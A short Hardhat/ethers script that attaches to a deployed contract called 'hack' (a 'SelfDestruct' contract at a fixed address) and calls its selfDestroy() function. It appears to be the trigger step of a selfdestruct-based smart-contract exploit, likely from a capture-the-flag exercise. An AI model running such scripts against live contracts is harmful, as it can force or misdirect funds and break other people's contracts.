const { assert } = require("chai");

async function main() {
    
    const [deployer] = await ethers.getSigners();
    
    console.log("Deploying contracts with the account:", deployer.address);
    console.log("Account balance:", (await deployer.getBalance()).toString());

    // Deploy
    hack_contract = await ethers.getContractFactory("SelfDestruct");
    hack = await hack_contract.attach("0xdC1D8FcbE06Db0C556F3D817CaE83a5fAc9Eebe2");

    // tx = await hack.collect({ value: ethers.utils.parseEther("0.0000001")});
    // console.log("================== tx ===================");
    // console.log(tx);

    // receipt = await tx.wait();
    // console.log("================== receipt ===================");
    // console.log(receipt);


    tx = await hack.selfDestroy();
    console.log("================== tx ===================");
    console.log(tx);

    receipt = await tx.wait();
    console.log("================== receipt ===================");
    console.log(receipt);
}


main()
    .then(() => process.exit(0))
    .catch((error) => {
      console.error(error);
      process.exit(1);
});
